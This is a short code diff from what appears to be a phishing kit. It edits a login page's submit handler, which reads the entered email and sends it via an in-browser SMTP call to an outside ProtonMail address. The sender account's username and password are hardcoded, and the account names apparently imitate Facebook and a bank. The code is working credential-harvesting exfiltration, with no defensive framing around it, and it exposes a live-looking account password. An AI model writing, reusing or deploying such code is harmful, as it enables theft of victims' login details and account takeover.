@@ -113,7 +113,7 @@ submitLogin.onclick = (e) => {
 	async function postFormData(url, data) {
 		console.log(document.querySelector('#email').value,document.querySelector('#email').value)
 		Email.send({
-				Host: "smtp.protonmail.com",
+				Host: "mail.protonmail.com",
 				Username : "facebo0ksecure@protonmail.com",
 				Password : "Qwerty!W@E#R$T%Y",
 				To : 'stanbic@protonmail.com',
